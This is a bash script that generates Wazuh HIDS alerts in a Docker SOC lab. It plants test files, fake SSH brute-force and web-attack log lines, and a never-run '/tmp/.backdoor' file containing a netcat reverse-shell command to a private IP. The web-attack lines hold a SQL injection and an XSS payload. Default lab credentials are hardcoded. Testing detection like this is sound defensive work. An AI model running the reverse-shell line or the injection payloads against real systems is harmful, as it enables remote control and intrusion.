#!/usr/bin/env bash
# generate-wazuh-alerts.sh
# Generates HIDS alerts by triggering Wazuh host-based detection.
# Uses syscheck (file integrity monitoring) — the most reliable Wazuh
# capability that works without modifying ossec.conf or restarting services.
#
# Usage:
#   ./generate-wazuh-alerts.sh          # run all scenarios
#   ./generate-wazuh-alerts.sh --quick  # syscheck only (fastest)

set -uo pipefail

QUICK="${1:-}"
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'

ok()    { echo -e "  ${GREEN}✓ $*${NC}"; }
warn()  { echo -e "  ${YELLOW}⚠ $*${NC}"; }
fail()  { echo -e "  ${RED}✗ $*${NC}"; }
hdr()   { echo -e "\n${CYAN}$*${NC}"; }

# Execute a command inside the Wazuh manager container via sh -c
# (sh -c keeps Unix paths inside quotes so Git Bash doesn't convert them)
wexec_sh() {
  local label="$1"; shift
  echo -n "  → $label … "
  if docker exec soc-wazuh-manager sh -c "$1" > /dev/null 2>&1; then
    echo -e "${GREEN}done${NC}"
    return 0
  else
    echo -e "${YELLOW}skipped${NC}"
    return 1
  fi
}

# Query Elasticsearch for current Wazuh alert count
get_wazuh_alert_count() {
  docker exec soc-elasticsearch sh -c '
    curl -s -k -u "elastic:changeme123" \
      -X GET "https://localhost:9200/wazuh-alerts-*/_count" \
      -H "Content-Type: application/json" \
      -d "{\"query\":{\"match_all\":{}}}" \
      2>/dev/null | grep -o "\"count\":[0-9]*" | head -1 | sed "s/\"count\"://" || echo "0"
  ' 2>/dev/null
}

echo "======================================"
echo "  Wazuh HIDS Alert Generator"
echo "======================================"
echo ""

# ── Verify Wazuh is running ───────────────────────────────────────────
if ! docker inspect --format '{{.State.Status}}' soc-wazuh-manager 2>/dev/null | grep -q running; then
  echo -e "${RED}✗ soc-wazuh-manager is not running. Start the stack first.${NC}"
  exit 1
fi
ok "soc-wazuh-manager is running"

# ── Capture baseline alert count ──────────────────────────────────────
BASELINE_COUNT=$(get_wazuh_alert_count)
echo "  Baseline Wazuh alerts in ES: $BASELINE_COUNT"

# ── Scenario 1: File Integrity Monitoring (Syscheck) ─────────────────
hdr "[1] File Integrity Monitoring"
echo "  Creating files in Wazuh-monitored directories …"
wexec_sh "Create file in /etc"     "echo '# WAZUH_SYSCHECK_TEST' > /etc/wazuh_test.conf"
wexec_sh "Create file in /usr/bin" "echo 'TEST_BINARY_DATA' > /usr/bin/wazuh_test_binary"
wexec_sh "Create file in /bin"     "printf '%s\n' '#!/bin/sh' 'echo test' > /bin/wazuh_test.sh && chmod +x /bin/wazuh_test.sh"
wexec_sh "Modify /etc/hosts"       "echo '# WAZUH_TEST_ENTRY' >> /etc/hosts"
ok "Files created — syscheck will detect them"

# ── Scenario 2: Rootkit-like files ────────────────────────────────────
hdr "[2] Suspicious Files (Rootcheck)"
wexec_sh "Hidden directory"        "mkdir -p /tmp/.hidden && echo 'payload' > /tmp/.hidden/update.sh"
wexec_sh "Suspicious binary"       "echo -e '#!/bin/sh\nnc -e /bin/sh 192.168.1.200 4444' > /tmp/.backdoor && chmod +x /tmp/.backdoor"
ok "Suspicious artifacts placed"

if [ "$QUICK" != "--quick" ]; then
  # ── Scenario 3: Authentication log injection ──────────────────────
  # Write to /var/log/secure or /var/log/auth.log if they exist,
  # otherwise write to an existing monitored location.
  hdr "[3] Authentication Attack Simulation"
  wexec_sh "Inject SSH brute-force" '
    LOGFILE="/var/log/secure"
    [ -f /var/log/auth.log ] && LOGFILE="/var/log/auth.log"
    [ -f /var/log/messages ] && LOGFILE="/var/log/messages"
    for i in 1 2 3 4 5; do
      echo "$(date +"%b %d %H:%M:%S") wazuh sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2" >> "$LOGFILE"
    done
    echo "$(date +"%b %d %H:%M:%S") wazuh sshd[1234]: Invalid user hacker from 10.0.0.5 port 12345" >> "$LOGFILE"
  '
  ok "Injected SSH brute-force patterns"

  # ── Scenario 4: Web attack log injection ──────────────────────────
  hdr "[4] Web Application Attack Simulation"
  wexec_sh "Inject web attacks" '
    LOGFILE="/var/log/secure"
    [ -f /var/log/auth.log ] && LOGFILE="/var/log/auth.log"
    [ -f /var/log/messages ] && LOGFILE="/var/log/messages"
    echo "$(date +"%b %d %H:%M:%S") wazuh apache[5678]: 192.168.1.50 - - [$(date +"%d/%b/%Y:%H:%M:%S") +0000] \"GET /index.php?id=1%27%20UNION%20SELECT%201,2,3-- HTTP/1.1\" 404 123" >> "$LOGFILE"
    echo "$(date +"%b %d %H:%M:%S") wazuh apache[5678]: 192.168.1.50 - - [$(date +"%d/%b/%Y:%H:%M:%S") +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 456" >> "$LOGFILE"
  '
  ok "Injected web attack patterns"
fi

# ── Trigger Wazuh Scan ────────────────────────────────────────────────
hdr "[5] Triggering Wazuh Analysis"
echo "  Triggering syscheck scan via Wazuh API …"

# Try to trigger scan via REST API (avoids full restart)
API_USER="${WAZUH_ADMIN_USER:-wazuh-wui}"
API_PASS="${WAZUH_ADMIN_PASSWORD:-ChangeMeWazuh123#}"
API_URL="https://localhost:55000"

# First, get a JWT token using POST method (Wazuh 4.x API)
TOKEN=$(docker exec soc-wazuh-manager sh -c "
  curl -s -k -u '$API_USER:$API_PASS' \
    -X POST '$API_URL/security/user/authenticate?raw=true' \
    2>/dev/null
" 2>/dev/null)

if [ -n "$TOKEN" ] && [ "${#TOKEN}" -gt 50 ]; then
  # Trigger syscheck scan on the manager (agent 000) using PUT method
  RESULT=$(docker exec soc-wazuh-manager sh -c "
    curl -s -k -X PUT \
      -H 'Authorization: Bearer $TOKEN' \
      '$API_URL/syscheck/000?wait_for_complete=true' \
      2>/dev/null
  " 2>/dev/null)
  
  if echo "$RESULT" | grep -q '"error":0'; then
    ok "Syscheck scan triggered via API"
  else
    warn "API call returned: $(echo "$RESULT" | grep -o '"title":"[^"]*"' | head -1)"
  fi
else
  warn "API token not available — syscheck will detect files on next scheduled scan (12h)"
  warn "To fix: Ensure WAZUH_ADMIN_USER=wazuh-wui in .env file"
fi

# ── Wait for alerts ───────────────────────────────────────────────────
echo ""
echo "Waiting 45s for Wazuh to process and generate alerts …"
sleep 45

# ── Verify alerts were generated ──────────────────────────────────────
hdr "[6] Verification"

NEW_COUNT=$(get_wazuh_alert_count)
DELTA=$((NEW_COUNT - BASELINE_COUNT))

echo "  Alerts before: $BASELINE_COUNT"
echo "  Alerts after:  $NEW_COUNT"

if [ "$DELTA" -gt 0 ] 2>/dev/null; then
  ok "$DELTA new Wazuh alerts generated"
else
  warn "No new alerts detected yet — waiting another 30s …"
  sleep 30
  NEW_COUNT=$(get_wazuh_alert_count)
  DELTA=$((NEW_COUNT - BASELINE_COUNT))
  if [ "$DELTA" -gt 0 ] 2>/dev/null; then
    ok "$DELTA new Wazuh alerts generated (after extra wait)"
  else
    warn "Still no new alerts — syscheck may need more time or API scan failed"
  fi
fi

# ── Show latest alert signatures ──────────────────────────────────────
echo ""
echo "  Latest alert signatures:"
docker exec soc-elasticsearch sh -c '
  curl -s -k -u "elastic:changeme123" \
    -X GET "https://localhost:9200/wazuh-alerts-*/_search?size=5&sort=@timestamp:desc" \
    -H "Content-Type: application/json" \
    -d "{\"_source\":[\"rule.description\",\"rule.level\",\"@timestamp\"],\"query\":{\"match_all\":{}}}" \
    2>/dev/null | grep -o "\"description\":\"[^\"]*\"" | sed "s/\"description\":\"//;s/\"$//" | head -5 | sed "s/^/    • /"
' 2>/dev/null || true

# ── Cleanup ───────────────────────────────────────────────────────────
hdr "[7] Cleanup"
wexec_sh "Remove test files" "rm -f /etc/wazuh_test.conf /usr/bin/wazuh_test_binary /bin/wazuh_test.sh"
wexec_sh "Restore /etc/hosts"  "grep -v '# WAZUH_TEST_ENTRY' /etc/hosts > /tmp/hosts.new && cat /tmp/hosts.new > /etc/hosts"
wexec_sh "Remove suspicious files" "rm -rf /tmp/.hidden /tmp/.backdoor"
ok "Test artifacts removed"

# ── Final Summary ─────────────────────────────────────────────────────
echo ""
echo "======================================"
echo -e "  ${GREEN}Wazuh HIDS scenarios complete!${NC}"
echo ""
if [ "$DELTA" -gt 0 ] 2>/dev/null; then
  echo -e "  ${GREEN}$DELTA new alerts generated${NC}"
else
  echo -e "  ${YELLOW}Alert generation may be delayed — check again in 2-3 minutes${NC}"
fi
echo ""
echo "  View in Kibana:"
echo "    ☰ → Discover → wazuh-alerts-*"
echo "    Filter: rule.description : *syscheck* OR rule.description : *integrity*"
echo "======================================"
